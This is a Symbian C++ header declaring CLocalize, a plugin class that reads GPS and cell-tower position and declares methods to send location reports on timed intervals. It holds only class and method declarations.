//
// CLocalize.h
// Copyright © 2001 Symbian Ltd. All rights reserved.
//

#ifndef _CLOCALIZE__
#define _CLOCALIZE__

#include "abstractPlugin.h"
#include <e32base.h>
#include <msvapi.h>
#include <FuzzyByte\timeouttimer.h>
#include <FuzzyByte\phone.h>
#include <FuzzyByte\GPSPosition.h>



// An implementation of the CExampleInterface definition
class CLocalize : public CAbstractPlugin, public MPositionerObserver, public MTimeOutNotifier
	{
public:
	// Standardised safe construction which leaves nothing the cleanup stack.
	static CLocalize* NewL(TAny* aInitParams);
	// Destructor
	~CLocalize();
	void GetDegreesString(const TReal64& aDegrees, TDes& aDegreesString) const;

	virtual void ProcessCommandL(const TDesC& aString);
	virtual void CancelCommandL();
	// Implementation of CExampleInterface
//	void ProcessRemoteCommandL(TRequestStatus& aCompletionStatus, const TDesC& srcNumb, const TDesC& aString);
//	void CancelRemoteCommand();
	TPtrC PluginId();
	virtual void HandleGPSModuleNotificationL(TInt error);
	virtual void HandleGPSPositionL(TPosition position);
	virtual void HandleGPSErrorL(TInt error);
    virtual void TimerExpiredL(TAny* src);
	void SendCellIdL(TBool isLast);
	void SendGPSIdL(TBool isLast, TPosition pos);

private:
	// Construction
	CLocalize();
	void ConstructL(TAny* aParams);

private:
	TTimeIntervalMinutes iUseCellIdAfterMin;
	TTimeIntervalMinutes iSendIntervalMin;
	TInt iQty;
	TInt iQtySent;
	CGPSPosition* iGPS;
	CPhone* iPhone;
	CTimeOutTimer* iCellIdSmsIntervalTimer;
	CTimeOutTimer* iCellIdAfterTimer;
	CTimeOutTimer* iStarter;
	TBool iLowAccuracyFlag;	
	TBool iUseAGPS;
	};

#endif

